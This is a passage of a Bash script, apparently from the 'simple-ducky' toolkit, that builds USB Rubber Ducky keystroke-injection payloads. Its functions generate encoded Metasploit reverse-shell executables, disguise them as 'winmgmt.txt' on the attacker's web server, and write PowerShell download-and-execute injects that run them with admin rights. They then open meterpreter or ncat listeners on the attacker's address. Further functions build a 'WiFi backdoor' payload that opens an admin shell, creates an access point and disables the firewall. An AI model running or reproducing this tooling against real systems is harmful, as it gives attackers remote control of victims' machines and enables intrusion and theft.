	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/powershellVIS7.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Powershell Download & Execute w/UAC (Admin Priv Shell|Win Vista/7)
#################################################################################
f_powershellVIS7admuac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide ethier a Meterpreter or Standard Shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with Admin privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit (Props to mubix for designing the orginal PD&E)"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo -e ""
	read -p "Would you like a meterpreter or Ncat shell[met/nc]? " payloadtype
	clear
	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/powershellVIS7admuac.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter		
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Powershell Download & Execute w/o UAC (Admin Priv Shell|Win Vista/7)
#################################################################################
f_powershellVIS7admnouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide ethier a Meterpreter or Standard Shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with Admin privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit (Props to mubix for designing the orginal PD&E)"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo -e ""
	read -p "Would you like a meterpreter or Ncat shell[met/nc]? " payloadtype
	clear
	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/powershellVIS7admnouac.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter		
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Powershell Download & Execute (User Priv Shell|Win 8)
#################################################################################
f_powershellWIN8(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide either a Meterpreter or Standard shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with user privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows 8"
	echo -e "\e[1;31mAuthor:\e[0m mubix"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo -e ""
	read -p "Would you like a meterpreter or Ncat shell[met/nc]? " payloadtype
	clear
	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/powershellWIN8.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Powershell Download & Execute w/UAC (Admin Priv Shell|Win 8)
#################################################################################
f_powershellWIN8admuac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide ethier a Meterpreter or Standard Shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with Admin privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit (Props to mubix for designing the orginal PD&E)"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo -e ""
	read -p "Would you like a meterpreter or Ncat shell[met/nc]? " payloadtype
	clear
	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/powershellWIN8admuac.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Powershell Download & Execute w/o UAC (Admin Priv Shell|Win 8)
#################################################################################
f_powershellWIN8admnouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide ethier a Meterpreter or Standard Shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with Admin privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit (Props to mubix for designing the orginal PD&E)"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo -e ""
	read -p "Would you like a meterpreter or Ncat shell[met/nc]? " payloadtype
	clear
	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/powershellWIN8admnouac.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter		
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
#################################################################################
#
# Wifi Attacks
#
#################################################################################
#################################################################################

#################################################################################
# WiFi Backdoor w/UAC (Win Vista/7)
#################################################################################
f_wifibackdoorVIS7uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload opens an Administrative cmd.exe session, then creates a wireless access point and disables the firewall"
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen"
	echo ""
	echo ""
	echo -e ""
	read -p "What would you like the SSID to be? " attackerssid
	echo ""
	read -p "What would you like the AP's key to be? " attackerkey
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard languagee\e[0m"
	echo ""
	sed "/STRING/s/attackerssid/$attackerssid/g" /usr/share/simple-ducky/payloads/wifibackdoorVIS7uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerkey/$attackerkey/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Backdoor w/o UAC (Win Vista/7)
#################################################################################
f_wifibackdoorVIS7nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload opens an Administrative cmd.exe session, then creates a wireless access point and disables the firewall"
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen"
	echo ""
	echo ""
	echo -e ""
	read -p "What would you like the SSID to be? " attackerssid
	echo ""
	read -p "What would you like the AP's key to be? " attackerkey
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard languagee\e[0m"
	echo ""
	sed "/STRING/s/attackerssid/$attackerssid/g" /usr/share/simple-ducky/payloads/wifibackdoorVIS7nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerkey/$attackerkey/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Backdoor w/UAC (Win 8)
#################################################################################
f_wifibackdoorWIN8uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload opens an Administrative cmd.exe session, then creates a wireless access point and disables the firewall"
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen"
	echo ""
	echo ""
	echo -e ""
	read -p "What would you like the SSID to be? " attackerssid
	echo ""
	read -p "What would you like the AP's key to be? " attackerkey
	echo ""
